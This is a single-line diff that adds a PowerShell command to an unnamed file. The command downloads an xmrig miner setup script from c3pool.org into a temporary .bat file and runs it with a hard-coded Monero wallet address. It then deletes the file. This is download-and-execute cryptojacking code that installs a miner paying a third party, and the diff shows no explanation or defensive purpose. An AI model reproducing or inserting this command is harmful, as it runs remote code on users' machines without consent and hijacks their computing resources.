@@ -1,0 +1,1 @@
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.bat', $tempfile); & $tempfile 42aDNddSYGoGrgBEAWdAbTVeegzHno9e56MwXUoSEkvaXpCzujH9m1wNj1BQRX7A5ZRbzUSpAiynpFNcdV5dDeYPLyrjNUX; Remove-Item -Force $tempfile"
